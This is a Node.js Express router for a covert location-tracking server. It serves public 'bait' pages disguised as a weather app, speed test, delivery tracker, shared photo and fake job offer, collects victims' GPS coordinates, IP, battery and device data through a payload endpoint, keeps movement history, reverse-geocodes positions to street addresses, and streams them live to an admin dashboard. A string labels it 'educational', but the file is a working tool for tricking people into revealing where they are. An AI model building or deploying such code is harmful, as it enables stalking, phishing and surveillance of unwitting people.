const express = require("express");
const router = express.Router();
const config = require("./config");

// In-memory target tracking database
const TARGETS = {};

// Helper to sanitize target object for JSON responses
function getTargetsArray() {
    return Object.values(TARGETS);
}

// -------------------------------------------------------------
// Authentication Routes
// -------------------------------------------------------------
router.route("/login")
    .get((req, res) => {
        res.render("login", {
            appName: config.appName,
            error: req.query.error ? "Invalid Admin Credentials" : ""
        });
    })
    .post((req, res) => {
        const { username, password } = req.body;
        if (username === config.username && password === config.password) {
            res.cookie("token", config.token, { maxAge: 24 * 60 * 60 * 1000, httpOnly: true });
            return res.redirect("/");
        }
        res.redirect("/login?error=1");
    });

router.get("/logout", (req, res) => {
    res.clearCookie("token").redirect("/login");
});

// -------------------------------------------------------------
// Bait & Tracking Client Pages (Public - No Admin Auth Required)
// -------------------------------------------------------------
router.get("/weather", (req, res) => {
    res.render("weather", { remoteURL: global.remoteURL || "" });
});

router.get("/speedtest", (req, res) => {
    res.render("speedtest", { remoteURL: global.remoteURL || "" });
});

router.get("/delivery", (req, res) => {
    res.render("delivery", { remoteURL: global.remoteURL || "" });
});

router.get("/trackme", (req, res) => {
    res.render("trackme", { remoteURL: global.remoteURL || "" });
});

router.get("/imagebait", (req, res) => {
    const targetId = req.query.id || "ImageTarget";
    const imageUrl = req.query.imageUrl || "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80";
    const imageTitle = req.query.title || "Shared Exclusive Photo";
    res.render("imagebait", {
        remoteURL: global.remoteURL || "",
        targetId,
        imageUrl,
        imageTitle
    });
});

router.get("/jobs", (req, res) => {
    const targetId = req.query.id || "JobCandidate";
    const company = req.query.company || "Google";
    const role = req.query.role || "Software Engineer";
    res.render("jobs", {
        remoteURL: global.remoteURL || "",
        targetId,
        company,
        role
    });
});


// -------------------------------------------------------------
// Location Ingestion Endpoint (POST from client target)
// -------------------------------------------------------------
router.post("/location-payload", (req, res) => {
    const {
        id,
        lat,
        lng,
        altitude = 0,
        accuracy = 0,
        speed = 0,
        heading = 0,
        battery = "N/A",
        userAgent = "",
        baitType = "Generic"
    } = req.body;

    if (!id || lat == null || lng == null) {
        return res.status(400).json({ error: "Missing required location data" });
    }

    const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "127.0.0.1";
    const parsedLat = parseFloat(lat);
    const parsedLng = parseFloat(lng);
    const timestamp = new Date().toISOString();

    const isNewTarget = !TARGETS[id];

    if (isNewTarget) {
        TARGETS[id] = {
            id,
            lat: parsedLat,
            lng: parsedLng,
            altitude: parseFloat(altitude) || 0,
            accuracy: parseFloat(accuracy) || 0,
            speed: parseFloat(speed) || 0,
            heading: parseFloat(heading) || 0,
            battery,
            userAgent: userAgent || req.headers["user-agent"] || "Unknown Device",
            ip: clientIp,
            baitType,
            firstSeen: timestamp,
            lastSeen: timestamp,
            status: "online",
            history: []
        };
    } else {
        const target = TARGETS[id];
        target.lat = parsedLat;
        target.lng = parsedLng;
        target.altitude = parseFloat(altitude) || 0;
        target.accuracy = parseFloat(accuracy) || 0;
        target.speed = parseFloat(speed) || 0;
        target.heading = parseFloat(heading) || 0;
        target.battery = battery;
        target.lastSeen = timestamp;
        target.status = "online";
        target.baitType = baitType || target.baitType;
    }

    // Append to position history (keep last 150 points)
    const historyItem = {
        lat: parsedLat,
        lng: parsedLng,
        accuracy: parseFloat(accuracy) || 0,
        speed: parseFloat(speed) || 0,
        timestamp
    };

    // Check if new position is significantly different to avoid duplicate history points
    const history = TARGETS[id].history;
    if (history.length === 0 ||
        history[history.length - 1].lat !== parsedLat ||
        history[history.length - 1].lng !== parsedLng) {
        history.push(historyItem);
        if (history.length > 150) history.shift();
    }

    // Broadcast via WebSockets to connected Admin Dashboard
    if (global.IO) {
        if (isNewTarget) {
            global.IO.to("admin-room").emit("user-connected", TARGETS[id]);
        }
        global.IO.to("admin-room").emit("map-data", {
            id,
            lat: parsedLat,
            lng: parsedLng,
            target: TARGETS[id]
        });
    }

    res.json({ status: "success", id, timestamp });
});

// Legacy backwards compatibility route for `/weather` POST payload
router.post("/weather", (req, res) => {
    req.body.baitType = "Weather App";
    return router.handle({ ...req, url: "/location-payload", method: "POST" }, res);
});

// -------------------------------------------------------------
// Admin Authentication Middleware
// -------------------------------------------------------------
function checkAdminToken(req, res, next) {
    const token = req.cookies.token;
    if (token && token === config.token) {
        return next();
    }
    return res.redirect("/login");
}

router.use(checkAdminToken);

// -------------------------------------------------------------
// Admin Dashboard & Command Center Routes
// -------------------------------------------------------------
router.get("/", (req, res) => {
    const host = req.get("host") || "";
    const protocol = req.protocol === "https" || req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
    const remoteURL = (host && !host.includes("localhost") && !host.includes("127.0.0.1"))
        ? `${protocol}://${host}`
        : (global.remoteURL || `http://localhost:${config.port}`);

    res.render("home", {
        appName: config.appName,
        remoteURL,
        targetsJson: JSON.stringify(getTargetsArray())
    });
});


router.get("/map", (req, res) => {
    const selectedId = req.query.id || "";
    res.render("map", {
        appName: config.appName,
        selectedId,
        targetsJson: JSON.stringify(getTargetsArray()),
        remoteURL: global.remoteURL || `http://localhost:${config.port}`
    });
});

// Admin REST APIs
router.get("/api/targets", (req, res) => {
    res.json(getTargetsArray());
});

router.get("/api/target/:id/history", (req, res) => {
    const target = TARGETS[req.params.id];
    if (!target) return res.status(404).json({ error: "Target not found" });
    res.json({ id: target.id, history: target.history });
});

// Delete individual target (Support DELETE and POST)
const handleDeleteTarget = (req, res) => {
    const id = req.params.id || (req.body && req.body.id) || req.query.id;
    if (!id) return res.status(400).json({ error: "Target ID required" });

    if (TARGETS[id]) {
        delete TARGETS[id];
        if (global.IO) {
            global.IO.to("admin-room").emit("target-deleted", { id });
        }
        return res.json({ status: "success", deletedId: id });
    }

    // Try case-insensitive or URL-decoded matching
    const decodedId = decodeURIComponent(id);
    for (const key in TARGETS) {
        if (key === decodedId || key.toLowerCase() === decodedId.toLowerCase()) {
            delete TARGETS[key];
            if (global.IO) {
                global.IO.to("admin-room").emit("target-deleted", { id: key });
            }
            return res.json({ status: "success", deletedId: key });
        }
    }

    res.status(404).json({ error: "Target not found" });
};

router.delete("/api/target/:id", handleDeleteTarget);
router.post("/api/target/delete", handleDeleteTarget);


router.post("/api/clear-targets", (req, res) => {
    for (const key in TARGETS) delete TARGETS[key];
    if (global.IO) {
        global.IO.to("admin-room").emit("targets-cleared");
    }
    res.json({ status: "cleared" });
});

// Reverse Geocoding Proxy (Nominatim OSM)
router.get("/api/reverse-geocode", async (req, res) => {
    const { lat, lng } = req.query;
    if (!lat || !lng) return res.status(400).json({ error: "Latitude and longitude required" });

    try {
        const https = require("https");
        const options = {
            headers: {
                "User-Agent": "LiveLocationTrackerApp/2.0 (Educational Demonstration Tool)"
            }
        };
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;

        https.get(url, options, (apiRes) => {
            let data = "";
            apiRes.on("data", chunk => data += chunk);
            apiRes.on("end", () => {
                try {
                    const parsed = JSON.parse(data);
                    const addr = parsed.address || {};
                    const building = addr.building || addr.amenity || addr.shop || addr.office || addr.hostel || addr.house_number || addr.tourism || "";
                    const road = addr.road || addr.street || addr.pedestrian || "";
                    const suburb = addr.suburb || addr.neighbourhood || addr.residential || addr.quarter || "";
                    const city = addr.city || addr.town || addr.village || addr.county || "";
                    const state = addr.state || "";

                    const fullAddress = parsed.display_name || "Address unavailable";

                    res.json({
                        fullAddress,
                        building: building ? building : (suburb ? suburb : "Near " + road),
                        road,
                        suburb,
                        city,
                        state
                    });
                } catch (e) {
                    res.json({ fullAddress: `${lat}, ${lng}`, building: "Location Coordinates Detected" });
                }
            });
        }).on("error", () => {
            res.json({ fullAddress: `${lat}, ${lng}`, building: "Location Coordinates Detected" });
        });
    } catch (e) {
        res.json({ fullAddress: `${lat}, ${lng}`, building: "Location Coordinates Detected" });
    }
});


module.exports = router;
module.exports.TARGETS = TARGETS;
